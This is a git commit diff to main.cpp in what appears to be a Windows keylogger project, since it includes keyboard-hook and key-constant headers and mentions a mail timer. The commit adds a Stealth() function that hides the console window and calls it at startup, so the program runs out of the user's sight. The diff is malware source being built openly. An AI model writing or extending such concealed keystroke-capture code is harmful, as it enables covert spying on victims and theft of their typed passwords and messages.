4c05f6c780a718964972fcab1069b42db0666cf6
Satya Pavan <pavan.simham@gmail.com>
2017-12-04 01:40:33 +0530

    added back the main func

--- main.cpp
+++ main.cpp
@@ -3,9 +3,33 @@
 #include "KeybHook.h"
 #include "Helper.h"
 #include "KeyConstants.h"
+#include "IO.h"
+#include "Timer.h"
+
+// defines whether the window is visible or not
+// should be solved with makefile, not in this file
+// Using this option is opening and closing a command prompt in quick succession.
+// Technically there is no window, but you see something happening as if a process has been started.
+#define invisible // (visible / invisible)
+
+
+void Stealth()
+{
+	#ifdef visible
+		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
+	#endif // visible
+
+	#ifdef invisible
+		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+	#endif // invisible
+}
+
 
 int main()
 {
+
+    Stealth();
+
     MSG Msg;
  //   IO::MKDir(IO::GetOurPath(true));
 
@@ -20,3 +44,4 @@ int main()
 //    MailTimer.Stop();
     return 0;
 }
+
